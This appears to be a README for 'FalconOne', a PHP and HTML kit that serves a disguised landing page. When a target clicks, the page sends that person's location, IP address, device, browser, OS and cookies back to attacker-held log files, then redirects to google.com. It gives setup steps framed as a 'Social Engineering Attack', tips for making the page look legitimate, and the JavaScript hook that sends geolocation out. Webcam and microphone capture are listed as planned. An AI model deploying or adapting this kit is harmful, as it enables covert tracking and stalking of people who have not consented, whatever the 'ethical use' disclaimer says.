# FalconOne (v.0.1)

FalconOne is an Open Source solution deployed and updated on daily basis to help prevent terror and crime. 
By using advanced tools, functions and stealth strategies, FalconOne's community is focused on making a friendly and fast solution for effective results.

GENERAL NOTICE:

FalconOne is deployed for ethical and educational purposes only. [Users Should READ the Terms before starting the installation process.](#8-user-Terms)


## Contents

1. [Functions Overview](#1-functions-overview)
2. [Scenarios](#1-Functions-Overview)
3. [Tool Overview](#3-Tool-Overview)
4. [Prerequisites](#4-Prerequisites)
5. [Installation/Setup](#5-InstallationSetup)
6. [Usage](#6-Usage)
7. [Community](#7-Community)
8. [User Terms](#8-user-Terms)
9. [Releases](#9-Releases)
10. [Templates](#10-Templates)


## 1. Functions Overview

### 1.2. Version 0.1 (In Progress to v1.0)

- [x] Target Accurate Location (via Google API)
- [x] Target Public IP Address
- [x] Target Open Port
- [x] Target Device Model and it Version
- [x] Target Browser Model and its Version
- [x] Target Operating System and its Version
- [x] Target Cookies
- [ ] Target Webcam Activation
- [ ] Target Microphone Activation
- [ ] Target Screen Screenshot


## 2. Scenarios

... In Progress


## 3. Tool Overview

FalconOne is based on PHP functions that collects and triggers browser's information functionalities via disguised HTML and CSS templates.
FalconOne is coded as explained below:

### 3.1. Landing Page(s)

- index.html (landing page)

### 3.2. Main Style

- styles/
  - /footer.css
  - /join.css
  - /main.css

### 3.3. PHP Functions

- forward.php

### 3.4. Loggers

- info.txt (for Locations)
- log.txt (for User-Agent information)


## 4. Prerequisites

- Apache (Tested) or Nginx Server
- Public IP Address or a Tunnel (e.g. [Ngrok](https://ngrok.com/))
- Domain Name (Recommended for a legit approach)
- SSL Certificate (for a secure look)


## 5. Installation/Setup

- Upload the Zip file on your Web Server Public directory
- Unzip the FolconOne uploaded file
- Customize index.html and CSS Styles files according to your Social Engineering Attack


## 6. Usage

Once deployed, wait for the target to interact with the landing page functions such as buttons, links, images and popups.
Once the Target interacts with the Landing page function(s), location(s) should be stored in info.txt and other information in log.txt.

The following PHP Functions logic in index.html should not be changed:

```
<p id="errorMessage"></p>

<script>
let message = document.getElementById("errorMessage");

function getLocation(){
  if(navigator.geolocation){
    navigator.geolocation.getCurrentPosition(sendLocation);
  } else{ 
    message.innerHTML = "<em>Your browser is not supported.</em>";
  }
}

function sendLocation(geoLocation) {
  window.location = "forward.php?x="+geoLocation.coords.latitude+"&y="+geoLocation.coords.longitude;
}
</script>
```

In forward.php line 37, you can edit the default redirection URL which is google.com by default:

```
header('Location: https://www.google.com/');
```

The main Hook function should be respected as below:

```
<a class="yourstyle" onclick="getLocation()">Button</a>
```


## 7. Community

... In Progress


## 8. User Terms

- Users are not allowed to deploy FalconOne on malicious operations
- Users are not allowed to share FalconOne on a commercial purpose or fix a price
- FalconOne is FREE
- FalconOne can be edited according to Users needs


## 9. Releases

- January 9th, 2022: FalconOne v.0.1 (Minor Update)
- January 8th, 2022: FalconOne v.0.1 (Major Upload): Initial Code Upload


## 10. Templates

... In Progress
